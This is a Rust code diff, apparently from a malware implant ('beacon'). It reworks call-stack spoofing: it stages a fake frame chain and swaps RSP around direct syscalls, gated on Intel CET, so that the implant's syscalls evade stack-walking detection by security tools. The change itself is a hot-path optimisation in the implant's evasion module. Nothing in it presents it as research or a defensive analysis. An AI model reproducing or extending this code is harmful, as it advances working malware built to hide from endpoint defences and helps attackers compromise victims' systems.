@@ -217,9 +217,10 @@ pub fn last_staged_depth() -> usize {
 /// the CET-aware seam is in place — wraps `f` in the spoofed-stack scope.
 ///
 /// With no pool installed OR the swap disabled (the default), this is a direct
-/// call to `f` plus a best-effort staging run (so the data path stays
-/// verifiable). This is the wiring that makes the spoof *available* on the
-/// syscall hot path without changing default beacon behavior.
+/// call to `f` with zero staging overhead. When the pool is installed AND swap
+/// is armed, the chain is staged and the RSP swap executes. This is the wiring
+/// that makes the spoof *available* on the syscall hot path without changing
+/// default beacon behavior.
 ///
 /// # Safety
 /// Same as [`with_spoofed_stack`]: the live RSP-swap path (when armed)
@@ -235,13 +236,13 @@ pub unsafe fn spoof_wrap<T>(f: impl FnOnce() -> T) -> T {
 /// Execute `f` with a spoofed call stack.
 ///
 /// **P2.1a-ii current behavior**:
-/// - The frame-chain synthesis + fake-stack staging ALWAYS runs (if `gaps` is
-///   non-empty), exercising the real `frame::build_leaf_bridge` data path — so
-///   a selftest can confirm the chain is well-formed.
-/// - The actual RSP swap runs ONLY when [`swap_enabled`] is true (an operator
-///   flips it after target-side validation AND the CET-aware seam lands). With
-///   the swap off, `f` is called directly — byte-identical to the pre-spoof
-///   behavior, so the beacon loop is never destabilized by an unvalidated swap.
+/// - When swap is disabled (the default), this is a direct call to `f` — no
+///   staging, no allocator overhead. This is the hot path on every syscall.
+/// - When swap is armed AND CET-off + gaps usable, the frame-chain synthesis +
+///   fake-stack staging runs, then the actual RSP swap executes around `f`.
+/// - With the swap off, `f` is called directly — byte-identical to the
+///   pre-spoof behavior, so the beacon loop is never destabilized by an
+///   unvalidated swap.
 ///
 /// The contract (returns whatever `f` returns) is fixed so `syscalls::syscallN`
 /// can wrap its trampoline invocation here without changing call sites when the
@@ -252,12 +253,16 @@ pub unsafe fn spoof_wrap<T>(f: impl FnOnce() -> T) -> T {
 /// stack pointer and return addresses; callers must treat `f` as running under
 /// unusual stack conditions. With the swap disabled `f` runs normally.
 pub unsafe fn with_spoofed_stack<T, F: FnOnce() -> T>(gaps: &GapPool, f: F) -> T {
-    // Always stage the chain (verifiable data path), even if we won't swap.
-    let _staged = stage_for(gaps);
+    // Fast path: swap not armed — skip staging entirely and call f directly.
+    // This avoids wasting allocator cycles on every syscall in the hot path
+    // when the swap is disabled (the default, and permanently off on CET-active
+    // hosts). The staging data path is still exercised via selftests that call
+    // `stage_for` directly.
     if !swap_enabled() {
-        // Swap not armed — call f directly. Identical to pre-spoof behavior.
         return f();
     }
+    // ---- SWAP ARMED: stage the chain, then check CET + gap usability ------
+    let _staged = stage_for(gaps);
     // ---- LIVE RSP SWAP (gated + CET-aware) ---------------------------------
     // Consult the pure CET-aware decision logic (evasionsdk::swap, 5 tests):
     // if CET is on OR gaps unusable, the swap would #CP or be useless → degrade.
